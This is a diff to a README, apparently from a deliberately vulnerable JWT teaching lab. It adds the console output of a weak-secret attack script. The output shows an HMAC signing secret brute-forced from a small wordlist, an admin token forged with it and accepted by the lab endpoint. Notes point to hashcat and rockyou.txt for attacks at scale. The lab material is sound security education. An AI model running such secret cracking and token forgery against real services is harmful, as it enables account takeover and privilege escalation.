@@ -237,7 +237,39 @@ python exploits/04_weak_secret.py
 
 ### Output
 
-*(Coming soon)*
+```
+============================================================
+ATTACK 4 - Weak secret brute force
+============================================================
+
+[1] Logging in as 'user'...
+    Token received: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c...
+
+[2] Original payload: {'sub': 'user', 'role': 'user', 'exp': 1781716955}
+
+[3] Brute forcing secret with 10 candidates...
+    (warnings below are PyJWT flagging weak key candidates - expected)
+InsecureKeyLengthWarning: The HMAC key is 8 bytes long...
+InsecureKeyLengthWarning: The HMAC key is 6 bytes long...
+InsecureKeyLengthWarning: The HMAC key is 5 bytes long...
+InsecureKeyLengthWarning: The HMAC key is 7 bytes long...
+    [!] Secret cracked: 'secret'
+
+[4] Forged payload: {'sub': 'admin', 'role': 'admin', 'exp': 1781716955}
+    Forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZ...
+
+[5] Sending forged token to /vuln/weak-secret...
+
+[6] Server response: {'message': 'Welcome, admin! Your role is: admin', 'payload': {'sub': 'admin', 'role': 'admin', 'exp': 1781716955}}
+
+[!] ATTACK SUCCESSFUL - Secret cracked and token forged
+    The signing secret 'secret' was found in a wordlist
+    An attacker can now forge any token with any payload
+```
+
+> **Note on wordlists:** This exploit uses a small hardcoded wordlist of 10 common secrets for demonstration purposes. In a real attack, tools like [hashcat](https://hashcat.net/hashcat/) with large wordlists such as `rockyou.txt` (14 million passwords) would be used instead. The mechanism is identical - the difference is scale. A weak secret falls in seconds regardless of wordlist size.
+
+> **Connection to Attack 3:** Once the secret is cracked, an attacker can also forge tokens with an `exp` claim set in the past. If the server does not validate expiry (Attack 3, Variant B), a cracked secret enables full control over any token claim - including expiration.
 
 ---
 
